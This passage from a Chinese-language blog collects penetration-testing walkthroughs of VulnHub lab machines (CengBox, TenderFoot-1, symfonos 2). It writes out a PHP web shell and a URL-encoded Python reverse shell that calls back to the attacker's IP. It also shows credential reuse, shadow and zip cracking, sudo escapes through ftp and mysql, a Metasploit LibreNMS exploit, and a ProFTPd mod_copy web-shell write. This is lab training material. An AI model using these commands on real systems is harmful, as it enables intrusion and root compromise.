src="/images/vulnhub_walkthrough_set/CengBox/img/07.png" alt="" /></p><p>WebShell的内容为 <code>&lt;?php @system($_GET[&quot;cmd&quot;]);?&gt;</code></p><p>WebShell存放路径为 <code>/uploads/shell.php.ceng</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/08.png" alt="" /></p><p>存在python3环境</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/09.png" alt="" /></p><p>使用WebShell进行反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9908</span><br><span class="line">curl http:&#x2F;&#x2F;192.168.1.104&#x2F;uploads&#x2F;shell.php.ceng?cmd&#x3D;python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27192.168.1.109%27%2C9908%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27&#x2F;bin&#x2F;bash%27%2C%27-i%27%5D%29%3B%22</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/10.png" alt="" /></p><h2 id="权限提升-33"><a class="markdownIt-Anchor" href="#权限提升-33"></a> 权限提升</h2><p>获取tty, 查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">uname -a</span><br><span class="line">cat &#x2F;etc&#x2F;*release</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/11.png" alt="" /></p><p>查看数据库信息<br /><code>cat /var/www/html/masteradmin/db.php</code><br />得到数据库账户信息 <code>root:SuperS3cR3TPassw0rd1!</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/12.png" alt="" /></p><p>进入数据库查看Web账户信息<br /><code>mysql -u root -pSuperS3cR3TPassw0rd1! -e 'select * from cengbox.admin;'</code><br />得到Web账户信息 <code>masteradmin:C3ng0v3R00T1!</code><br /><img src="/images/vulnhub_walkthrough_set/CengBox/img/13.png" alt="" /></p><p>查看账户信息<br /><code>cat /etc/passwd</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/14.png" alt="" /></p><p>尝试登入cengover账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh cengover@192.168.1.104</span><br><span class="line">C3ng0v3R00T1!</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/15.png" alt="" /></p><p>在pspy目录开启HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 9900&amp;</span><br></pre></td></tr></table></figure><p>下载并使用pspy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.109:9900&#x2F;pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64&amp;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/16.png" alt="" /></p><p>存在root的计划任务<br />查看脚本文件</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/17.png" alt="" /></p><p>拥有写入权限<br />可以写入反弹Shell命令</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/18.png" alt="" /></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8087</span><br></pre></td></tr></table></figure><p>获取root权限</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/19.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="tenderfoot-1"><a class="markdownIt-Anchor" href="#tenderfoot-1"></a> <a href="https://www.vulnhub.com/entry/tenderfoot-1,581/">TenderFoot-1</a></h1><p><code>2020/10/28 21:29:04</code></p><h2 id="寻找靶机ip-18"><a class="markdownIt-Anchor" href="#寻找靶机ip-18"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/00.png" alt="" /></p><h2 id="端口扫描-34"><a class="markdownIt-Anchor" href="#端口扫描-34"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.108</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/01.png" alt="" /></p><h2 id="web路径扫描-17"><a class="markdownIt-Anchor" href="#web路径扫描-17"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.108/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/02.png" alt="" /></p><h2 id="漏洞利用-34"><a class="markdownIt-Anchor" href="#漏洞利用-34"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.108/</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/03.png" alt="" /><br />提示需要进行路径枚举</p><p>查看源代码得到提示 <code>/robots.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/04.png" alt="" /></p><p><code>/robots.txt</code> 提示路径 <code>/hint</code><br />访问<code>/hint</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/05.png" alt="" /><br />存在HTML注释中存在Base32编码<br />解码结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> ____________________</span><br><span class="line">| N0thing Here!      |</span><br><span class="line">| Try something else!|</span><br><span class="line"> --------------------</span><br><span class="line">Enumerate more :)�</span><br></pre></td></tr></table></figure><p>继续枚举路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/06.png" alt="" /></p><p>访问 <code>/fotocd</code><br />HTML注释中存在BrainFuck编码</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/07.png" alt="" /></p><p>解码结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">JDk5OTkwJA&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Did you found username ?</span><br><span class="line">if yes:</span><br><span class="line">    Then you have cred. of one user, enter into user account </span><br><span class="line">    by ssh port. syntax:&#123;ssh username@IP&#125;</span><br><span class="line">if not:</span><br><span class="line">    Then enumerate more :)</span><br><span class="line">    G00D LUCK !</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#39;JDk5OTkwJA&#x3D;&#x3D;&#39; | base64 -d</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure><p>继续枚举其他类型WEB文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -x .html,.php,.css,.js</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/08.png" alt="" /></p><p>访问 <code>/entry.js</code><br />内容为 <code>monica</code></p><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh monica@192.168.1.108</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/09.png" alt="" /></p><h2 id="权限提升-34"><a class="markdownIt-Anchor" href="#权限提升-34"></a> 权限提升</h2><p>得到提示信息</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/10.png" alt="" /></p><p>访问 <code>/fotocd/0x0343548764</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/11.png" alt="" /></p><p>下载并解压ZIP文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.1.108&#x2F;fotocd&#x2F;0x0343548764&#x2F;joey.zip</span><br><span class="line">unzip joey.zip</span><br><span class="line">#9175</span><br></pre></td></tr></table></figure><p>得到两个文件: <code>gift.zip</code>, <code>note.txt</code><br />note.txt的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Not this time DUDE!</span><br><span class="line"></span><br><span class="line">Just G00GLE and learn how to crack zip passwords :)</span><br><span class="line"></span><br><span class="line">you will learn new thing!</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>破解gift.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip gift.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u</span><br></pre></td></tr></table></figure><p>得到密码为 <code>h4ck3d</code></p><p>解压后得到 <code>gift.txt</code>，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Hahaha! there is no gift !</span><br><span class="line">Your Bad Luck!</span><br><span class="line"></span><br><span class="line">But what happened if you don&#39;t get gift.</span><br><span class="line"></span><br><span class="line">Take a hint from my side, which may help you to solve this box further.</span><br><span class="line"></span><br><span class="line">I make a binary to get another user&#39;s shell,</span><br><span class="line">Just google, command for search&#x2F;find SUID or binaries and figure it out how to execute this binary.</span><br><span class="line"></span><br><span class="line">G00D LUCK! :)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>搜索SUID文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>找到文件 <code>/opt/exec/chandler</code><br />执行后用户身份变为 <code>chandler</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/12.png" alt="" /></p><p>查看提示信息</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/13.png" alt="" /></p><p>Base32解码的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd:Y0uCr4ckM3</span><br></pre></td></tr></table></figure><p>SSH登入chandler账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh chandler@192.168.1.108</span><br><span class="line">Y0uCr4ckM3</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/14.png" alt="" /></p><p>进行sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;ftp</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/15.png" alt="" /></p><hr /><blockquote><p>SUDO &amp; GID</p></blockquote><p>使用脚本切换用户身份时，只是简单地更换了UID与GID，并没有添加用户所属的groups，所以不能直接进行sudo提权而是需要使用SSH登入之后再提权</p><p>参考资料</p><blockquote><p><a href="https://www.infosecarticles.com/tenderfoot-vulnhub-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-2"><a class="markdownIt-Anchor" href="#symfonos-2"></a> <a href="https://www.vulnhub.com/entry/symfonos-2,331/">symfonos 2</a></h1><p><code>2020/10/28 08:21:48</code></p><h2 id="寻找靶机ip-19"><a class="markdownIt-Anchor" href="#寻找靶机ip-19"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/00.png" alt="" /></p><h2 id="端口扫描-35"><a class="markdownIt-Anchor" href="#端口扫描-35"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.107</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/01.png" alt="" /></p><h2 id="web路径扫描-18"><a class="markdownIt-Anchor" href="#web路径扫描-18"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.107/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/02.png" alt="" /></p><h2 id="漏洞利用-35"><a class="markdownIt-Anchor" href="#漏洞利用-35"></a> 漏洞利用</h2><p>收集smb信息<br /><code>enum4linux 192.168.1.107</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/04.png" alt="" /></p><p>目录/anonymous可以匿名访问，使用空账户即可登入<br />且获得用户名<code>aeolus</code>，<code>cronus</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/05.png" alt="" /></p><p>下载并查看<code>log.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/06.png" alt="" /></p><p>内容为smb.conf与proftpd.conf<br />smb的<code>/anonymous</code>路径对应<code>/home/aeolus/share/</code><br />ftp存在匿名访问</p><p>尝试匿名访问FTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.1068.1.107</span><br><span class="line">anonymous</span><br><span class="line">anonymous</span><br><span class="line">site cpfr &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">site cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/07.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/08.png" alt="" /></p><p>通过smb服务获取shadow的备份文件</p><p>使用john破解Hash</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/09.png" alt="" /></p><p>得到账户信息<code>aeolus:sergioteamo</code></p><p>使用账户信息登入SSH</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/10.png" alt="" /></p><h2 id="权限提升-35"><a class="markdownIt-Anchor" href="#权限提升-35"></a> 权限提升</h2><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;*release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/11.png" alt="" /></p><p>查看网络端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -antlp</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/12.png" alt="" /></p><p>目标对本地开放25，3306，8080端口</p><p>使用nc探测本地8080端口</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/13.png" alt="" /></p><p>本地8080端口存在Web服务</p><p>进行端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:1235,fork tcp-connect:localhost:8080 &amp;</span><br></pre></td></tr></table></figure><p>使用浏览器访问目标1235端口</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/14.png" alt="" /></p><p>使用<code>aeolus</code>账户进行登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/15.png" alt="" /></p><p>查询相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit librenms</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/16.png" alt="" /></p><p>使用MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;librenms_addhost_cmd_inject</span><br><span class="line">set RHOST 192.168.1.107</span><br><span class="line">set RPORT 1235</span><br><span class="line">set USERNAME aeolus</span><br><span class="line">set PASSWORD sergioteamo</span><br><span class="line">set LHOST 192.168.1.103</span><br><span class="line">set LPORT 9999</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/17.png" alt="" /></p><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/18.png" alt="" /></p><p>进行sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root mysql -e &#39;\! &#x2F;bin&#x2F;bash&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/19.png" alt="" /></p><hr /><blockquote><p>ProFRPd 1.3.5 mod_copy</p></blockquote><p>该模块允许未授权用户进行任意文件拷贝操作，配合SMB访问以及已知SMB路径即可完成任意文件下载/上传操作<br />该模块也存在写入Webshell的操作，具体操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://blog.barradell-johns.com/index.php/2019/08/25/symfonos-two-writeup/">WalkThrough</a><br /><a href="https://www.exploit-db.com/exploits/37262">写入WebShell</a></p></blockquote><hr /><h1 id="fishymail"><a class="markdownIt-Anchor" href="#fishymail"></a> <a href="https://www.vulnhub.com/entry/fishymail-1,583/">FishyMail</a></h1><p><code>2020/11/04 20:52:24</code></p><h2 id="寻找靶机ip-20"><a class="markdownIt-Anchor" href="#寻找靶机ip-20"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/00.png" alt="" /></p><h2 id="端口扫描-36"><a class="markdownIt-Anchor" href="#端口扫描-36"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/01.png" alt="" /></p><h2 id="web路径扫描-19"><a class="markdownIt-Anchor" href="#web路径扫描-19"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.103/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/FishyMail/img/02.png" alt="" /></p><h2 